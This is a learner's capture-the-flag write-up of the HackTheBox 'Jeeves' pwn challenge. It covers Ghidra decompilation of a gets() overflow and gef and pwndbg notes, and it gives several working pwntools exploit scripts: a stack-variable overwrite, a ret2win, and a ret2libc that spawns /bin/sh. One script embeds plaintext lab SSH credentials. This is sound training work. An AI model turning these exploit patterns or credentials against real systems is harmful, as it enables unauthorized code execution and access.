# Jeeves Helped-Through

Name: Jeeves
Type: Pwn
Date:  11/3/2024
Difficulty:  Easy
Goals:  
- Begin the learn to Pwn all the things with Retired Box with CryptoCat, Active box for 
Learnt:
- See Beyond Root
Beyond Root:
- Improve Templating script
- Start Revering and Pwning based Question methodologies

While setting up I found how I needed to improve my system so by the time I had done basic file checks  and then started [CryptoCat Writeup](https://www.youtube.com/watch?v=SgoCGETbnZg) I did not realise I do the [[Reg-Helped-Through]] (was almost a Writeup!) first as that is apparently a simple buffer overflow and ret2win style challenge. So I will start that first try for an hour and if I fail I will turn it to a helped-through cited CryptoCat as i have done here. Also I will attempt one HTB Active Challenge from this Category to make a start getting my teeth into pushing points and really developing this area of Hacking skillset. As Low-Level is the future and probably my weakest area in terms of coverage in my Cheatsheets, Archive, etc...

![](strings-jeeves.png)
![](segfaultjeeveswithmsfpc.png)
![](angrforjeeves.png)
![](patternsearch69.png)

We need to be at 0x55b1b778c23f 
![](jumptomalloctowin.png)
 
Try 0 offset and `0x1337bab3` and 69 offset and the memory address 0x55b1b778c23f 
![1920](bothtimes.png)

#### Following along with [CryptoCat](https://github.com/Crypto-Cat/) 

1. Ghidra Revision
![](importghidra.png)

- **Do not assume** the order of variables pushed to the stack, it depends on compilation and language - there is very limited information about this... have you tested and noted the ordering of pushes to memory or stack of variables,data, etc?
	- What is a total of all variables placed on the stack?
		- [[Ghidra]] per function with `-0xSignedOffsetAsHex:NumberOfAVal`

Ghidra helpful does some of the work:
![](ghidranumberandsize.png)


Mine did not work but:
`Right Click -> Covert` value to a format or encoding

main
```c
undefined8 main(void)

{
  char local_48 [44]; // Buffer!
  int local_1c;
  void *local_18;
  int local_c;
  
  local_c = -0x21523f2d; // - 0xdeadc0d3 != 0x1337bab3
  printf("Hello, good sir!\nMay I have your name? ");
  gets(local_48);
  printf("Hello %s, hope you have a good day!\n",local_48);
  if (local_c == 0x1337bab3) {
    local_18 = malloc(0x100);
    local_1c = open("flag.txt",0);
    read(local_1c,local_18,0x100);
    printf("Pleased to make your acquaintance. Here\'s a small gift: %s\n",local_18);
    close(local_1c);
  }
  return 0;
}
```

![](deadcodelcocalcvariable.png)

And in `gef`
![](entry-break-disassemblegef.png)

Reading the [gef](https://hugsy.github.io/gef/) documentation 
```c
// Binary Patch specified values to an specified address 
patch

gef➤ patch byte $eip 0x90
gef➤ patch string $eip "cool!"
// Copy first ten bytes of a byte array from $rsp+8 to $rip
gef➤  print-format --lang bytearray -l 10 $rsp+8
Saved data b'\xcb\xe3\xff\xff\xff\x7f\x00\x00\x00\x00'... in '$_gef0'
gef➤  patch byte $rip $_gef0
```
This very cool
```c
// Checks and create a new pane for output
gef➤ tmux-setup
gef➤ screen-setup // the structure of `screen` does not allow a very clean way to do this.
```

```c
// name-break
gef➤ nb 0x914c3
gef➤ nb first *0x400ec0
gef➤ nb "main func" main
gef➤ nb read_secret *main+149
gef➤ nb check_heap
```

![1920](gefisgoodbutilkikepwndebugsuser2inpwndebug.png)
What is weird about watching along, there is a null byte `\n` in mine, but not on CryptoCat's. I have an offset of 69 and he has 72
![](haveagoodday.png)

Reconsidering pwndbg and moving to `pwndebug`
```c

info functions

disassemble main

cyclic 100
cyclic -l 

// Open radare12 from pwndbg
pwndbg> r2 -d2 
```

But 
- **Architecture Support**: One of the key differences is in the architecture support. PEDA, which pwndbg is based on, is fundamentally linked to Intel architectures (x86-32 and x86-64). In contrast, GEF (GDB Enhanced Features) supports a broader range of architectures, including x86, ARM, AARCH64, MIPS, PowerPC, and SPARC, and is designed to easily integrate new architectures
![](geforpwndebug.png)

- A common error to not worry about, is the `pwn` `x.sendlineafter("string to send after", payload)` the correct string?
- Have you checked both how the local and remote version accept input as they may differ?!


![](72fromgef.png)
![](60fromcountinginghidra.png)

Modified script from my template
```python
from pwn import *
import time

context.terminal = ['tmux', 'new-window']
target = './jeeves'
context.binary = target
context.log_level = 'debug' # info, debug will print flag in table with addresses,hex and translated ASCII with columns
binary = ELF(target)

rhost = "94.237.60.100" 
rport = 42400 

# SSH connection variables
ssh_host = '10.10.10.10'
ssh_user = '!'
ssh_pass = '!'
ssh_port = 22

def find_eip(payload):
    p = process(binary)
    p.sendlineafter('>', payload)
    p.wait()
    eip_offset = cyclic_find(p.corefile.eip)
    info('located EIP offset at {a}'.format(a=eip_offset))
    return eip_offset

# offset = find_eip(cyclic(100))
offset = 60

payload = flat(
        {offset: 0x1337bab3}
)

# Write payload to file
# write('payload-pwn', payload)

if args['SSH']:
    sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)
    p = sh.run('/bin/bash')
    junk = p.recv(4096,timeout=2)
    p.sendline(target)
if args['PWN']:
    r = remote(rhost, rport) 
    # r.sendlineafter("Hello, good sir!", payload)
    r.sendline(payload)
    r.recvuntil('Here is a small gift:')
    flag = r.recv()
    success(flag)
    r.close()
if args['GEF']:
    p = process(target,setuid=True)
    gdb.attach(p, gdbscript='continue')
    p.sendlineafter("Hello, good sir!", payload)
    time.sleep(10)
    p.recvuntil('Here is a small gift:')
    flag = p.recv()
    success(flag)
    p.close()

```


## Post Completion Reflection

- My control flow logic and problem solving is on point, but my pwntools is not
- Do not trust one tool or manual check with reversing 
- more gef 
- pwndbg can use r2 inside itself!

Reversing
- Have tested a manual check or a tool with another type of check for the same output?
- Whats string data is exposed?
	- `Ghidra Search -> Strings`
	- [[Strings]]
- How can you make it more readable to track what matters - Reading is not enough for Reversing, change the names
	- [[Ghidra]] `Right Click -> Covert` value to a format or encoding
- **Do not assume** the order of variables pushed to the stack, it depends on compilation and language - there is very limited information about this... have you tested and noted the ordering of pushes to memory or stack of variables,data, etc?
	- What is a total of all variables placed on the stack?
		- [[Ghidra]] per function with `-0xSignedOffsetAsHex:NumberOfAVal`

Pwning
- A common error to not worry about, is the `pwn` `x.sendlineafter("string to send after", payload)` the correct string?
- Have you checked both how the local and remote version accept input as they may differ?!
- **Do not assume** the order of variables pushed to the stack, it depends on compilation and language - there is very limited information about this... have you tested and noted the ordering of pushes to memory or stack of variables,data, etc?
	- What is a total of all variables placed on the stack?
		- [[Ghidra]] per function with `-0xSignedOffsetAsHex:NumberOfAVal`

## Beyond Root

Original
```python
from pwn import *
import struct

context.terminal = ['tmux', 'new-window']
target = './pwn_me'
context.binary = target
binary = ELF(target)
libc = ELF("./libc.so.6")

ssh_host = '10.10.232.171'
ssh_user = 'guardian'
ssh_pass = 'GOg0esGrrr!'
ssh_port = 22

kkif args['SSH']:
    sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)
    p = sh.run('/bin/bash')
    junk = p.recv(4096,timeout=2)
    p.sendline(target)
else:
    p = process(target,setuid=True)


p.recvline()
leak = p.recvline()[-11:].rstrip(b"\n")
system = int(leak[2:],16)
log.info(hex(system))
libc.address = system - libc.symbols['system']

buffer = b""
buffer += b"A"*32
buffer += p64(libc.symbols['system'])
buffer += p64(next(libc.search(b'/bin/sh\x00')))

gdb.attach(p, gdbscript='continue')
p.sendline(buffer)

p.interactive()
```

Reg
```python
from pwn import *
import time

context.terminal = ['tmux', 'new-window']
target = './reg'
context.binary = target
binary = ELF(target)

rhost = "83.136.252.214" 
rport = 36577 

offset = 56

payload = flat(
        {offset: 0x401206}
)


if args['PWN']:
    r = remote(rhost, rport) 
    r.sendlineafter('Enter your name :', payload)
    r.recvuntil('Congratulations!\n')
    flag = r.recv()
    success(flag)
    r.close()
if args['GEF']:
    p = process(target,setuid=True)
    gdb.attach(p, gdbscript='continue')
    p.sendlineafter('Enter your name :', payload)
    time.sleep(10)
    p.recvuntil('Congratulations!\n')
    flag = p.recv()
    success(flag)
    p.close()
```

Improved my template
```python
from pwn import *
import time

context.terminal = ['tmux', 'new-window']
target = './binary'
context.binary = target
context.log_level = 'debug' # info, debug will print flag in table with addresses,hex and translated ASCII with columns
binary = ELF(target)

rhost = '10.10.10.10' 
rport = 31337 

# SSH connection variables
ssh_host = '10.10.10.10'
ssh_user = '!'
ssh_pass = '!'
ssh_port = 22

def find_eip(payload):
    p = process(binary)
    p.sendlineafter('>', payload)
    p.wait()
    eip_offset = cyclic_find(p.corefile.eip)
    info('located EIP offset at {a}'.format(a=eip_offset))
    return eip_offset

# offset = find_eip(cyclic(100))
offset = 60

payload = flat(
        {offset: 0x1337bab3}
)

# Write payload to file
# write('payload-pwn', payload)

if args['SSH']:
    sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)
    p = sh.run('/bin/bash')
    junk = p.recv(4096,timeout=2)
    p.sendline(target)
if args['PWN']:
    r = remote(rhost, rport) 
    # r.sendlineafter("SomeSendLineStringHere", payload)
    r.sendline(payload)
    r.recvuntil('SomeRecieveStringHere')
    flag = r.recv()
    success(flag)
    r.close()
if args['GEF']:
    p = process(target,setuid=True)
    gdb.attach(p, gdbscript='continue')
    p.sendlineafter("SomeSendLineStringHere", payload)
    time.sleep(10)
    p.recvuntil('SomeRecieveStringHere')
    flag = p.recv()
    success(flag)
    p.close()
else: 
    print("Vim search and replace: %s/SomeRecieveStringHere/ /g")
    print("Vim search and replace: %s/SomeSendLineStringHere/ /g")
```